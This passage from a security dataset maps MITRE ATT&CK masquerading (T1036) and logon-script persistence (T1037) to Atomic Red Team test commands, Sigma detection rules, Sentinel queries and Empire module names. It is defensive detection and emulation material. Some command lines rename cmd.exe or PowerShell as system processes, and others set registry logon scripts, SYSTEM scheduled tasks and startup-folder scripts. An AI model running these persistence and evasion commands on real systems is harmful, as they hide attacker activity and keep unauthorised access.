"mitre_attack": "T1036", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100079", "os": "windows", "parent_process": "svchosts.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "masquerading", "mitre_attack": "T1036", "itw_sample": ""}}], "command_list": ["copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "cp /bin/sh /tmp/crond\n/tmp/crond\n", "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "copy PathToAtomicsFolder\\T1036\\bin\\t1036.exe #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "copy $env:ComSpec #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036 > C:\\T1036.txt\n", "*.exe", "\\Recycle.bin", "*.exe", "\\Users\\All Users\\", "*.exe", "\\Users\\Default\\", "*.exe", "\\Users\\Public\\", "*.exe", "\\Perflogs\\", "*.exe", "\\config\\systemprofile\\", "*.exe", "\\Windows\\Fonts\\", "*.exe", "\\Windows\\IME\\", "*.exe", "\\Windows\\addins\\", "*.exe", "\\ProgramData\\", "csrsr.exe", "csrss.exe", "!=*\\Windows\\System32\\", "cssrss.exe", "explorer.exe", "!=*\\Windows\\System32\\", "iexplore.exe", "isass.exe", "lexplore.exe", "lsm.exe", "!=*\\Windows\\System32\\", "lssass.exe", "mmc.exe", "!=*\\Windows\\System32\\", "!=wininit.exe", "lsass", "run32dll.exe", "rundII.exe", "scvhost.exe", "smss.exe", "!=services.exe", "svchost.exe", "svchosts.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \".doc.\"or process_path contains \".docx.\"or process_path contains \".xls.\"or process_path contains \".xlsx.\"or process_path contains \".pdf.\"or process_path contains \".rtf.\"or process_path contains \".jpg.\"or process_path contains \".png.\"or process_path contains \".jpeg.\"or process_path contains \".zip.\"or process_path contains \".rar.\"or process_path contains \".ppt.\"or process_path contains \".pptx.\")", "name": "Masquerading Extension"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 11 and (process_path contains \"SysWOW64\"or process_path contains \"System32\"or process_path contains \"AppData\"or process_path contains \"Temp\")and (file_name contains \".exe\"or file_name contains \".dll\"or file_name contains \".bat\"or file_name contains \".com\"or file_name contains \".ps1\"or file_name contains \".py\"or file_name contains \".js\"or file_name contains \".vbs\"or file_name contains \".hta\")", "name": "Masquerading Location"}], "possible_detections": [{"data_source": {"title": "Ps.exe Renamed SysInternals Tool", "id": "18da1007-3f26-470f-875d-f77faf1cab31", "description": "Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report", "references": ["https://www.us-cert.gov/ncas/alerts/TA17-293A"], "tags": ["attack.defense_evasion", "attack.g0035", "attack.t1036", "car.2013-05-009"], "author": "Florian Roth", "date": "2017/10/22", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "ps.exe -accepteula"}, "condition": "selection"}, "falsepositives": ["Renamed SysInternals tool"], "level": "high"}}, {"data_source": {"title": "Masquerading as Linux crond process", "id": "9d4548fa-bba0-4e88-bd66-5d5bf516cda0", "status": "experimental", "description": "Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036/T1036.yaml"], "logsource": {"product": "linux", "service": "auditd"}, "detection": {"selection": {"type": "execve", "a0": "cp", "a1": "-i", "a2": "/bin/sh", "a3": "*/crond"}, "condition": "selection"}, "level": "medium", "tags": ["attack.defense_evasion", "attack.t1036"]}}, {"data_source": {"title": "Renamed ProcDump", "id": "4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67", "status": "experimental", "description": "Detects the execution of a renamed ProcDump executable often used by attackers or malware", "references": ["https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"], "author": "Florian Roth", "date": "2019/11/18", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"OriginalFileName": "procdump"}, "filter": {"Image": ["*\\procdump.exe", "*\\procdump64.exe"]}, "condition": "selection and not filter"}, "falsepositives": ["Procdump illegaly bundled with legitimate software", "Weird admins who renamed binaries"], "level": "critical"}}, {"data_source": {"title": "Exploit for CVE-2015-1641", "id": "7993792c-5ce2-4475-a3db-a3a5539827ef", "status": "experimental", "description": "Detects Winword starting uncommon sub process MicroScMgmt.exe as used in exploits for CVE-2015-1641", "references": ["https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/", "https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100"], "author": "Florian Roth", "date": "2018/02/22", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\WINWORD.EXE", "Image": "*\\MicroScMgmt.exe "}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "PowerShell Base64 Encoded Shellcode", "id": "2d117e49-e626-4c7c-bd1f-c3c0147774c8", "description": "Detects Base64 encoded Shellcode", "status": "experimental", "references": ["https://twitter.com/cyb3rops/status/1063072865992523776"], "author": "Florian Roth", "date": "2018/11/17", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": "*AAAAYInlM*"}, "selection2": {"CommandLine": ["*OiCAAAAYInlM*", "*OiJAAAAYInlM*"]}, "condition": "selection1 and selection2"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "Windows Processes Suspicious Parent Directory", "id": "96036718-71cc-4027-a538-d1587e0006a7", "status": "experimental", "description": "Detect suspicious parent processes of well-known Windows processes", "author": "vburov", "references": ["https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2", "https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/", "https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf", "https://attack.mitre.org/techniques/T1036/"], "date": "2019/02/23", "modified": "2019/08/20", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\svchost.exe", "*\\taskhost.exe", "*\\lsm.exe", "*\\lsass.exe", "*\\services.exe", "*\\lsaiso.exe", "*\\csrss.exe", "*\\wininit.exe", "*\\winlogon.exe"]}, "filter": {"ParentImage": ["*\\System32\\\\*", "*\\SysWOW64\\\\*", "*\\SavService.exe", "*\\Windows Defender\\\\*\\MsMpEng.exe"]}, "filter_null": {"ParentImage": null}, "condition": "selection and not filter and not filter_null"}, "falsepositives": ["Some security products seem to spawn these"], "level": "low"}}, {"data_source": {"title": "Renamed Binary", "id": "36480ae1-a1cb-4eaa-a0d6-29801d7e9142", "status": "experimental", "description": "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.", "author": "Matthew Green - @mgreen27", "date": "2019/06/15", "references": ["https://attack.mitre.org/techniques/T1036/", "https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html", "https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html"], "tags": ["attack.t1036", "attack.defense_evasion"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"OriginalFileName": ["cmd.exe", "powershell.exe", "powershell_ise.exe", "psexec.exe", "psexec.c", "cscript.exe", "wscript.exe", "mshta.exe", "regsvr32.exe", "wmic.exe", "certutil.exe", "rundll32.exe", "cmstp.exe", "msiexec.exe", "7z.exe", "winrar.exe"]}, "filter": {"Image": ["*\\cmd.exe", "*\\powershell.exe", "*\\powershell_ise.exe", "*\\psexec.exe", "*\\psexec64.exe", "*\\cscript.exe", "*\\wscript.exe", "*\\mshta.exe", "*\\regsvr32.exe", "*\\wmic.exe", "*\\certutil.exe", "*\\rundll32.exe", "*\\cmstp.exe", "*\\msiexec.exe", "*\\7z.exe", "*\\winrar.exe"]}, "condition": "selection and not filter"}, "falsepositives": ["Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist"], "level": "medium"}}, {"data_source": {"title": "Execution of Renamed PaExec", "id": "7b0666ad-3e38-4e3d-9bab-78b06de85f7b", "status": "experimental", "description": "Detects execution of renamed paexec via imphash and executable product string", "references": ["sha256=01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc", "https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf"], "tags": ["attack.defense_evasion", "attack.t1036", "FIN7", "car.2013-05-009"], "date": "2019/04/17", "author": "Jason Lynch", "falsepositives": ["Unknown imphashes"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"Product": ["*PAExec*"]}, "selection2": {"Imphash": ["11D40A7B7876288F919AB819CC2D9802", "6444f8a34e99b8f7d9647de66aabe516", "dfd6aa3f7b2b1035b76b718f1ddc689f", "1a6cca4d5460b1710a12dea39e4a592c"]}, "filter1": {"Image": "*paexec*"}, "condition": "(selection1 and selection2) and not filter1"}}}, {"data_source": {"title": "Suspicious Calculator Usage", "id": "737e618a-a410-49b5-bec3-9e55ff7fbc15", "description": "Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion", "status": "experimental", "references": ["https://twitter.com/ItsReallyNick/status/1094080242686312448"], "author": "Florian Roth", "date": "2019/02/09", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": "*\\calc.exe *"}, "selection2": {"Image": "*\\calc.exe"}, "filter2": {"Image": "*\\Windows\\Sys*"}, "condition": "selection1 or ( selection2 and not filter2 )"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Parent of Csc.exe", "id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee", "description": "Detects a suspicious parent of csc.exe, which could by a sign of payload delivery", "status": "experimental", "references": ["https://twitter.com/SBousseaden/status/1094924091256176641"], "author": "Florian Roth", "date": "2019/02/11", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\csc.exe*", "ParentImage": ["*\\wscript.exe", "*\\cscript.exe", "*\\mshta.exe"]}, "condition": "selection"}, "falsepositives": ["Unkown"], "level": "high"}}, {"data_source": {"title": "Executables Started in Suspicious Folder", "id": "7a38aa19-86a9-4af7-ac51-6bfe4e59f254", "status": "experimental", "description": "Detects process starts of binaries from a suspicious folder", "author": "Florian Roth", "date": "2017/10/14", "modified": "2019/02/21", "references": ["https://github.com/mbevilacqua/appcompatprocessor/blob/master/AppCompatSearch.txt", "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["C:\\PerfLogs\\\\*", "C:\\$Recycle.bin\\\\*", "C:\\Intel\\Logs\\\\*", "C:\\Users\\Default\\\\*", "C:\\Users\\Public\\\\*", "C:\\Users\\NetworkService\\\\*", "C:\\Windows\\Fonts\\\\*", "C:\\Windows\\Debug\\\\*", "C:\\Windows\\Media\\\\*", "C:\\Windows\\Help\\\\*", "C:\\Windows\\addins\\\\*", "C:\\Windows\\repair\\\\*", "C:\\Windows\\security\\\\*", "*\\RSA\\MachineKeys\\\\*", "C:\\Windows\\system32\\config\\systemprofile\\\\*"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Execution in Non-Executable Folder", "id": "3dfd06d2-eaf4-4532-9555-68aca59f57c4", "status": "experimental", "description": "Detects a suspicious exection from an uncommon folder", "author": "Florian Roth", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\$Recycle.bin", "*\\Users\\All Users\\\\*", "*\\Users\\Default\\\\*", "*\\Users\\Public\\\\*", "C:\\Perflogs\\\\*", "*\\config\\systemprofile\\\\*", "*\\Windows\\Fonts\\\\*", "*\\Windows\\IME\\\\*", "*\\Windows\\addins\\\\*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious MsiExec Directory", "id": "e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144", "status": "experimental", "description": "Detects suspicious msiexec process starts in an uncommon directory", "references": ["https://twitter.com/200_okay_/status/1194765831911215104"], "tags": ["attack.defense_evasion", "attack.t1036"], "author": "Florian Roth", "date": "2019/11/14", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\msiexec.exe"}, "filter": {"Image": ["C:\\Windows\\System32\\\\*", "C:\\Windows\\SysWOW64\\\\*", "C:\\Windows\\WinSxS\\\\*"]}, "condition": "selection and not filter"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Program Location Process Starts", "id": "f50bfd8b-e2a3-4c15-9373-7900b5a4c6d5", "status": "experimental", "description": "Detects programs running in suspicious files system locations", "references": ["https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo"], "tags": ["attack.defense_evasion", "attack.t1036"], "author": "Florian Roth", "date": "2019/01/15", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\$Recycle.bin", "*\\Users\\Public\\\\*", "C:\\Perflogs\\\\*", "*\\Windows\\Fonts\\\\*", "*\\Windows\\IME\\\\*", "*\\Windows\\addins\\\\*", "*\\Windows\\debug\\\\*"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Process Start Locations", "id": "15b75071-74cc-47e0-b4c6-b43744a62a2b", "description": "Detects suspicious process run from unusual locations", "status": "experimental", "references": ["https://car.mitre.org/wiki/CAR-2013-05-002"], "author": "juju4", "tags": ["attack.defense_evasion", "attack.t1036", "car.2013-05-002"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*:\\RECYCLER\\\\*", "*:\\SystemVolumeInformation\\\\*", "C:\\\\Windows\\\\Tasks\\\\*", "C:\\\\Windows\\\\debug\\\\*", "C:\\\\Windows\\\\fonts\\\\*", "C:\\\\Windows\\\\help\\\\*", "C:\\\\Windows\\\\drivers\\\\*", "C:\\\\Windows\\\\addins\\\\*", "C:\\\\Windows\\\\cursors\\\\*", "C:\\\\Windows\\\\system32\\tasks\\\\*"]}, "condition": "selection"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "medium"}}, {"data_source": {"title": "Suspicious Svchost Process", "id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d", "status": "experimental", "description": "Detects a suspicious svchost process start", "tags": ["attack.defense_evasion", "attack.t1036"], "author": "Florian Roth", "date": "2017/08/15", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\svchost.exe"}, "filter": {"ParentImage": ["*\\services.exe", "*\\MsMpEng.exe", "*\\Mrt.exe", "*\\rpcnet.exe"]}, "filter_null": {"ParentImage": null}, "condition": "selection and not filter and not filter_null"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Taskmgr as LOCAL_SYSTEM", "id": "9fff585c-c33e-4a86-b3cd-39312079a65f", "status": "experimental", "description": "Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM", "tags": ["attack.defense_evasion", "attack.t1036"], "author": "Florian Roth", "date": "2018/03/18", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"User": "NT AUTHORITY\\SYSTEM", "Image": "*\\taskmgr.exe"}, "condition": "selection"}, "falsepositives": ["Unkown"], "level": "high"}}, {"data_source": {"title": "Taskmgr as Parent", "id": "3d7679bd-0c00-440c-97b0-3f204273e6c7", "status": "experimental", "description": "Detects the creation of a process from Windows task manager", "tags": ["attack.defense_evasion", "attack.t1036"], "author": "Florian Roth", "date": "2018/03/13", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\taskmgr.exe"}, "filter": {"Image": ["*\\resmon.exe", "*\\mmc.exe", "*\\taskmgr.exe"]}, "condition": "selection and not filter"}, "fields": ["Image", "CommandLine", "ParentCommandLine"], "falsepositives": ["Administrative activity"], "level": "low"}}, {"data_source": {"title": "System File Execution Location Anomaly", "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915", "status": "experimental", "description": "Detects a Windows program executable started in a suspicious folder", "references": ["https://twitter.com/GelosSnake/status/934900723426439170"], "author": "Florian Roth, Patrick Bareiss", "date": "2017/11/27", "tags": ["attack.defense_evasion", "attack.t1036"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\svchost.exe", "*\\rundll32.exe", "*\\services.exe", "*\\powershell.exe", "*\\regsvr32.exe", "*\\spoolsv.exe", "*\\lsass.exe", "*\\smss.exe", "*\\csrss.exe", "*\\conhost.exe", "*\\wininit.exe", "*\\lsm.exe", "*\\winlogon.exe", "*\\explorer.exe", "*\\taskhost.exe"]}, "filter": {"Image": ["C:\\Windows\\System32\\\\*", "C:\\Windows\\SysWow64\\\\*", "C:\\Windows\\explorer.exe", "C:\\Windows\\winsxs\\\\*"]}, "condition": "selection and not filter"}, "falsepositives": ["Exotic software"], "level": "high"}}]}, {"technique_id": "T1037", "commands": [{"source": "atomics/T1037/T1037.yaml", "command": "echo \"#{script_command}\" > %temp%\\art.bat\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"%temp%\\art.bat\" /f\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "echo \"echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "schtasks /create /tn \"T1037_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1037_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "name": null}, {"source": "atomics/T1037/T1037.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "name": null}, {"source": "SysmonHunter - Logon Scripts", "command": "\\Environment\\UserInitMprLogonScript", "name": null}, {"source": "SysmonHunter - Logon Scripts", "command": "\\Environment\\UserInitMprLogonScript", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/desktopfile", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/multi/desktopfile", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/loginhook", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/loginhook", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Logon Scripts": {"attack_technique": "T1037", "display_name": "Logon Scripts", "atomic_tests": [{"name": "Logon Scripts", "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n", "supported_platforms": ["windows"], "input_arguments": {"script_path": {"description": "Path to .bat file", "type": "String", "default": "%temp%\\art.bat"}, "script_command": {"description": "Command To Execute", "type": "String", "default": "echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037-log.txt"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "echo \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n", "cleanup_command": "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f >nul 2>&1\ndel #{script_path} >nul 2>&1\ndel \"%USERPROFILE%\\desktop\\T1037-log.txt\" >nul 2>&1\n"}}, {"name": "Scheduled Task Startup Script", "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "schtasks /create /tn \"T1037_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1037_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "cleanup_command": "schtasks /delete /tn \"T1037_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1037_OnStartup\" /f >nul 2>&1\n"}}, {"name": "Logon Scripts - Mac", "description": "Mac logon script\n", "supported_platforms": ["macos"], "executor": {"name": "manual", "steps": "1. Create the required plist file\n\n    sudo touch /private/var/root/Library/Preferences/com.apple.loginwindow.plist\n\n2. Populate the plist with the location of your shell script\n\n    sudo defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n\n3. Create the required plist file in the target user's Preferences directory\n\n\t  touch /Users/$USER/Library/Preferences/com.apple.loginwindow.plist\n\n4. Populate the plist with the location of your shell script\n\n\t  defaults write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n"}}, {"name": "Supicious vbs file run from startup Folder", "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1137 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n"}}, {"name": "Supicious jse file run from startup Folder", "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1137 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\jsestartup.jse \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n"}}, {"name": "Supicious bat file run from startup Folder", "description": "bat files can be placed in and executed from the startup folder to maintain persistance.\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item $PathToAtomicsFolder\\T1037\\src\\batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n"}}]}}, {"SysmonHunter - T1037": {"name": "Logon Scripts", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "process", "process": {"cmdline": {"pattern": "\\Environment\\UserInitMprLogonScript"}}}, {"type": "reg", "reg": {"path": {"pattern": "\\Environment\\UserInitMprLogonScript"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/multi/desktopfile", "ATT&CK Technique #1": "T1037", "ATT&CK Technique #2": "", "Technique": "Logon Scripts", "Concatenate for Python Dictionary": "\"python/persistence/multi/desktopfile\":  [\"T1037\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/persistence/osx/loginhook", "ATT&CK Technique #1": "T1037", "ATT&CK Technique #2": "", "Technique": "Logon Scripts", "Concatenate for Python Dictionary": "\"python/persistence/osx/loginhook\":  [\"T1037\"],"}}], "command_list": ["echo \"#{script_command}\" > 